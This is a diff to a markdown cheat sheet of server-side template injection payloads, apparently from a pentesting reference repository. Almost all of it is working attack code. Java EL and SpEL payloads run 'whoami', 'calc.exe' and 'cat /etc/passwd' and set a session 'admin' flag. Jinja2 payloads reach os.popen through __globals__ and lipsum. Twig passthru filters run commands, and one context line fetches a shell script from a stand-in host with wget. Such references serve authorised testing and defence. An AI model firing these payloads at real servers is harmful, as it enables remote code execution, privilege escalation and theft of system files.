@@ -145,8 +145,23 @@ ${{<%[%'"}}%\.
 ### Expression Language EL - Basic injection
 
 ```java
+${<property>}
 ${1+1}
+
+#{<expression string>}
 #{1+1}
+
+T(<javaclass>)
+```
+
+### Expression Language EL - Properties
+
+* Interesting properties to access `String`, `java.lang.Runtime`
+
+```ps1
+${2.class}
+${2.class.forName("java.lang.String")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
 ```
 
 ### Expression Language EL - One-Liner injections not including code execution
@@ -157,6 +172,9 @@ ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClas
 
 // JVM System Property Lookup (ex: java.class.path)
 ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+
+// Modify session attributes
+${pageContext.request.getSession().setAttribute("admin",true)}
 ```
 
 ### Expression Language EL - Code Execution
@@ -181,9 +199,13 @@ ${request.getAttribute("a")}
 
 // Method using Reflection & Invoke
 ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
 
 // Method using ScriptEngineManager one-liner
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+
+// Method using JavaClass
+T(java.lang.Runtime).getRuntime().exec('whoami').x
 
 // Method using ScriptEngineManager
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
@@ -355,7 +377,7 @@ ${T(java.lang.System).getenv()}
 ### Java - Retrieve /etc/passwd
 
 ```java
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
 
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
@@ -471,6 +493,12 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 ```
 
+Access `__globals__` and `__builtins__`:
+
+```python
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
 ### Jinja2 - Dump all config variables
 
 ```python
@@ -523,7 +551,11 @@ def hook(*args, **kwargs):
 
 #### Exploit the SSTI by calling os.popen().read()
 
-These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
@@ -531,7 +563,7 @@ These payloads are context-free, and do not require anything, except being in a 
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-We can use these shorter payloads (this is the shorter payloads known yet):
+We can use these shorter payloads:
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -540,6 +572,14 @@ We can use these shorter payloads (this is the shorter payloads known yet):
 ```
 
 Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
+
+```python
+{{ lipsum.__globals__["os"].popen('id').read() }}
+```
+
+Source: https://twitter.com/podalirius_/status/1655970628648697860
 
 #### Exploit the SSTI by calling subprocess.Popen
 
@@ -934,6 +974,8 @@ $output = $twig > render (
 {{['id',1]|sort('system')|join}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['id']|map('passthru')}}
 ```
 
 Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
@@ -1122,3 +1164,6 @@ layout template:
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
 * [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
 * [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
+* [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+* [Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+* [Expression Language Injection - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
